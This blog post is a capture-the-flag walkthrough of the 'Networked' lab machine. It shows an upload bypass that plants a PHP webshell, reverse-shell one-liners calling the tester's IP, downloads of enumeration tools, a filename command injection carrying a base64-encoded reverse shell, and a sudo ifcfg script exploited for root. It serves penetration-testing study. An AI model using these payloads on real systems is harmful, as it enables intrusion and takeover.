---
layout: post
title: "networked"
date: 2025-09-26 
categories: OSCP Playlist
---
# networked

# Summary

- ffuf to fuzz for subdir
- source code disclosure in /backup dir of upload.php
- file upload bypass prepending extensions and spoofing mime types; uploaded webshell
- executed reverse shell from webshell
- cronjobs in guly’s dir  is vulnerable to command injection, base64 encoded payload to get reverse shell as guly
- sudo -l reveal binary that executes ifcfg script, exploited the space vulnerability to get root

# Attack Path

## Initial Enumeration

First enumerate the open ports and service:

```bash
sudo nmap -sC -sV -oN nmap/networked 10.10.10.146

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
```

We have a php server with CentOS backend. Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/networked/image.png)

Viewing the page source:

```bash
<html>
<body>
Hello mate, we're building the new FaceMash!</br>
Help by funding us and be the new Tyler&Cameron!</br>
Join us at the pool party this Sat to get a glimpse
<!-- upload and gallery not yet linked -->
</body>
</html>
```

Let’s start fuzzing for subdir:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.146/FUZZ -ic

backup
uploads
```

Let’s visit /uploads:

![image.png]({{ site.baseurl }}/assets/networked/image%201.png)

Blank page.

Let’s visit /backup.

![image.png]({{ site.baseurl }}/assets/networked/image%202.png)

Let’s download the tar file

```bash
tar -xvf backup.tar

index.php
lib.php
photos.php
upload.php
```

### upload.php:

```bash
<?php
require '/var/www/html/lib.php';

define("UPLOAD_DIR", "/var/www/html/uploads/");

if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "<p>Unable to save file.</p>";
        exit;
    }
    echo "<p>file uploaded, refresh gallery</p>";

    // set proper permissions on the new file
    chmod(UPLOAD_DIR . $name, 0644);
  }
} else {
  displayform();
}
?>

```

If we visit upload.php, we get a file upload site; let’s upload a test image:

![image.png]({{ site.baseurl }}/assets/networked/image%203.png)

Now we visit photos.php and we see our image file displayed, along with our IP.

![image.png]({{ site.baseurl }}/assets/networked/image%204.png)

## Foothold via WebShell

Let’s capture the request on Burp, then send it to repeater. Let’s attempt to bypass the file upload restrictions.

From the upload.php, the extension check tests whether the *original filename* ends with `.jpg`, etc. But filenames like `shell.php.jpg` pass the check. The `ext` variable becomes `php.jpg` (see below) and the saved file is `10_0_0_1.php.jpg`. If your webserver executes files based on content or misconfiguration (e.g. `AddHandler` mapping), this could allow code execution. Even if not executable by extension, some servers may be misconfigured to parse PHP in uploaded files, or rely on other content-type rules.

Example: `evil.php.jpg` -> saved as `10_0_0_1.php.jpg`. If server is misconfigured to treat `.php.jpg` as PHP (rare but possible), this is a direct RCE path.

Let’s first spoof the file name to test.php.jpg. It worked. Now let’s add our webshell payload:

```bash
<?php system($_GET['cmd']); ?>
```

![image.png]({{ site.baseurl }}/assets/networked/image%205.png)

Now let’s visit our malicious file.

```bash
http://10.10.10.141/uploads/10_10_16_7.php.jpg
```

We get a blank page and don’t see our php code. That’s a good sign, as it might indicate our php code is rendered and executed. Let’s go on burp and pass a command:

```bash
http://10.10.10.141/uploads/10_10_16_7.php.jpg?cmd=id
```

![image.png]({{ site.baseurl }}/assets/networked/image%206.png)

We get a response back stating we are user apache. Now let’s get a reverse shell:

```bash
#start a listener
nc -lnvp 4444

#execute reverse shell, don't forget to URL encode
cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.7 4444>/tmp/f

nc -e /bin/sh 10.10.16.7 4444

bash -c 'sh -i >& /dev/tcp/10.10.16.9/9001 0>&1'
```

The third one worked.

Let’s upgrade shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png]({{ site.baseurl }}/assets/networked/image%207.png)

## Privilege Escalation to guly

Nothing from basic enumeration, not in privileged groups or part of sudoers. Let’s enumerate with linpeas:

```bash
cd /dev/shm
curl -o linpeas.sh http://10.10.16.7:8001/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

```bash
                ╔════════════════════════════════════════════════╗                                                                                       
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                       
                ╚════════════════════════════════════════════════╝ 
                
                
root       3306  0.0  2.9 358288 29100 ?        Ssl  14:30   0:00 /usr/bin/python -Es /usr/sbin/firewalld --nofork --nopid
root       3349  0.0  0.1 126284  1592 ?        Ss   14:30   0:00 /usr/sbin/crond -n
root       3352  0.0  0.0 110104   872 tty1     Ss+  14:30   0:00 /sbin/agetty --noclear tty1 linux
root       3731  0.0  1.9 573924 19172 ?        Ssl  14:30   0:01 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
root       3733  0.0  0.4 112864  4352 ?        Ss   14:30   0:00 /usr/sbin/sshd -D
root       3735  0.0  0.4 214444  4856 ?        Ssl  14:30   0:00 /usr/sbin/rsyslogd -n
root       3950  0.0  0.2 111196  2396 ?        Ss   14:31   0:00 sendmail: accepting connections
smmsp      3965  0.0  0.2 106620  2032 ?        Ss   14:33   0:00 sendmail: Queue runner@01:00:00 for /var/spool/clientmqueue
root       4113  0.0  0.1 125384  1116 ?        Ss   15:01   0:00 /usr/sbin/anacron -s

╔══════════╣ Files inside others home (limit 20)
/home/guly/check_attack.php
/home/guly/crontab.guly
/home/guly/.bash_logout
/home/guly/.bash_profile
/home/guly/.bashrc
/home/guly/user.txt

╔══════════╣ Mails (limit 50)
  5740    4 -rw-rw----   1 guly     mail         2941 Jul  2  2019 /var/mail/guly
  5740    4 -rw-rw----   1 guly     mail         2941 Jul  2  2019 /var/spool/mail/guly

```

Let’s also execute pspy to see what cron jobs are running. Errored out:

```bash
curl -o pspys http://10.10.16.7:8001/pspy64s_2018
```

We saw some interesting files in guly’s home dir. Let’s see if we have permissions to access his files in his home dir:

```bash
ls -al /home/guly

total 28
drwxr-xr-x. 2 guly guly 4096 Sep  6  2022 .
drwxr-xr-x. 3 root root   18 Jul  2  2019 ..
lrwxrwxrwx. 1 root root    9 Sep  7  2022 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc
-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly   33 Sep 26 14:30 user.txt

```

The crontab and php file stood out. Let’s check crontab.guly first:

```bash
cd /home/guly
cat crontab.guly

*/3 * * * * php /home/guly/check_attack.php
```

Every 3 minutes, the system runs the PHP script `check_attack.php` using the system’s PHP interpreter. It runs under the **crontab owner’s privileges** (in this case, the user `guly`).

### check_attack.php analysis

```bash
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

The for loop:

```bash
foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);
```

This check every file in the /var/www/html/uploads directory, except for index.html then split the files up into two variables from the first . (dot) e.g.:

```bash
upload.php -> $name=upload $ext=php
```

Then, it checks if the name is a valid IP address, for example when we uploaded our image, our image name got turned into 10_10_16_7.php.

```bash
$check = check_ip($name,$value);
```

- Validates $name with filter_var(..., FILTER_VALIDATE_IP).
- Returns (true, $filename) if valid, (false, "attack message") if invalid.

Then if the filename does not start with an IP it will execute the following, which is vulnerable to a command injection

```bash
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
mail($to, $msg, $msg, $headers, "-F$value");

```

- `$value` (the filename) is **user-controlled -** we could upload a name with the command we want to execute e.g.:

```bash
test.jpg;nc -e sh 10.10.16.7 9001;
```

- Then when exec("rm -f $path$value") runs, it will execute our command.

First let’s start a listener

```bash
nc -lvnp 9001
```

Let’s go to /var/www/html/uploads and create a file with that name:

```bash
touch 'test.jpg;nc -e bash 10.10.16.7 9001;.php'
```

It connected but quits immediately:

![image.png]({{ site.baseurl }}/assets/networked/image%208.png)

Let’s try to base64 encode our payload and execute it like that, “/” is not allowed in a filename.

```bash
echo -n "bash -i >& /dev/tcp/10.10.16.7/9001 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43LzkwMDEgMD4mMQ==
```

Now our payload will be:

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43LzkwMDEgMD4mMQ== | base64 -d | bash

touch ';echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43LzkwMDEgMD4mMQ== | base64 -d | bash;'
```

![image.png]({{ site.baseurl }}/assets/networked/image%209.png)

We now have guly shell.

Let’s go through simple checks:

```bash
sudo -l

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh

```

Looking at the script, we realise it’s running in privileged mode:

```bash
#!/bin/bash -p
```

```bash
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF
```

Uses a here-document to **overwrite** `/etc/sysconfig/network-scripts/ifcfg-guly` with three lines:

- `DEVICE=guly0` — defines the name of the interface this config belongs to.
- `ONBOOT=no` — do not activate at boot.
- `NM_CONTROLLED=no` — NetworkManager should not manage it (typical RHEL/CentOS style).

```bash
regexp="^[a-zA-Z0-9_\ /-]+$"
```

Defines a regex that will be used to validate user input. It allows:

- upper/lower letters `A–Z a–z`
- digits `0–9`
- underscore `_`
- space
- forward slash `/`
- hyphen
- The `^` and `$` anchors require the entire input to match at least one character (because of the `+`).

```bash
for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

```

Loop: iterates over four variable names that correspond to config keys.

- For each `var`:
    1. Prints a prompt like `interface NAME:`.
    2. `read x` — reads a line from **standard input** into variable `x`. This is interactive; if the script is run non-interactively it will block/wait for input.
    3. `while [[ ! $x =~ $regexp ]]; do ... done` — re-prompts until the entered string matches the defined regex.
    4. `echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly` — appends a line like `NAME=value` to the config file.

```bash
/sbin/ifup guly0

```

- Calls `ifup` to bring the interface `guly0` up using the newly-created config file. This will run scripts in `/etc/sysconfig/network-scripts/ifcfg-guly` and attempt to configure the interface at the kernel/network level.

Searching up ifcfg exploit resulted in this:

https://seclists.org/fulldisclosure/2019/Apr/24

It seems like in our inputs, we can add space then add a command, then that command will executed. Let’s try that:

```bash
sudo /usr/local/sbin/changename.sh
```

![image.png]({{ site.baseurl }}/assets/networked/image%2010.png)

We now have root